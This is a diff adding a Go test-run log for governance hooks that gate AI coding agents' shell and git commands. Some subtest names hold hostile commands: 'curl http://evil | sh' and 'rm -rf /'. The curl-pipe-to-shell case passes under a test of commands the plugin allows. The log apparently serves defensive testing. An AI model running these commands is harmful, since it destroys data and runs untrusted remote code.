@@ -1,0 +1,176 @@
+=== RUN   TestPreToolHooksDelegateToCanonicalScript
+=== PAUSE TestPreToolHooksDelegateToCanonicalScript
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+=== PAUSE TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/go_build_./...
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/curl_http://evil_|_sh
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/ls_-la
+--- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed (0.98s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/go_build_./... (0.44s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/curl_http://evil_|_sh (0.28s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/ls_-la (0.26s)
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-rf_/
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-fr_/some/path
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_--recursive_--force_/var
+--- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed (0.76s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-rf_/ (0.25s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-fr_/some/path (0.25s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_--recursive_--force_/var (0.26s)
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_commit_-m_x
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_push_origin_main
+--- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed (0.49s)
+    --- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_commit_-m_x (0.24s)
+    --- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_push_origin_main (0.24s)
+=== RUN   TestOpenCodeGovernancePluginAllowsGitCommitWithBothEscapesConfirmed
+--- PASS: TestOpenCodeGovernancePluginAllowsGitCommitWithBothEscapesConfirmed (0.26s)
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_status
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_diff
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_log_--oneline_-5
+--- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed (0.76s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_status (0.25s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_diff (0.26s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_log_--oneline_-5 (0.26s)
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+=== CONT  TestPreToolHooksDelegateToCanonicalScript
+=== CONT  TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+=== CONT  TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+=== CONT  TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+=== CONT  TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWith1911299823/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolDecisionIsIdenticalAcrossAllFourAgents3344838868/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_commit_-m_x
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHooksDelegateToCanonicalScript2426190714/001
+Modo de instalacao: copy
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfi107314356/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed896666396/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadCo2472161417/001
+Modo de instalacao: copy
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_status
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/claude
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/claude
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+--- PASS: TestPreToolHooksDelegateToCanonicalScript (0.39s)
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_commit_-m_x
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/codex
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_status
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/codex
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_commit_-m_x
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/copilot
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_status
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/copilot
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_push_origin_main
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_diff
+--- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed (1.11s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/claude (0.26s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/codex (0.24s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/copilot (0.22s)
+--- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed (1.17s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/claude (0.28s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/codex (0.27s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/copilot (0.25s)
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_push_origin_main
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_diff
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_push_origin_main
+--- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents (0.37s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing (0.81s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed (0.82s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file (1.04s)
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_diff
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_log_--oneline_-5
+--- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed (1.61s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_commit_-m_x (0.27s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_commit_-m_x (0.24s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_commit_-m_x (0.22s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_push_origin_main (0.19s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_push_origin_main (0.16s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_push_origin_main (0.16s)
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_log_--oneline_-5
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_log_--oneline_-5
+--- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed (2.11s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_status (0.27s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_status (0.25s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_status (0.22s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_diff (0.19s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_diff (0.17s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_diff (0.17s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_log_--oneline_-5 (0.16s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_log_--oneline_-5 (0.17s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_log_--oneline_-5 (0.15s)
+PASS
+ok  	github.com/JailtonJunior94/ai-spec-harness/tests/integration	8.488s
+testing: warning: no tests to run
+PASS
+ok  	github.com/JailtonJunior94/ai-spec-harness/tests/integration/hooks_live	3.077s [no tests to run]
+exit=0
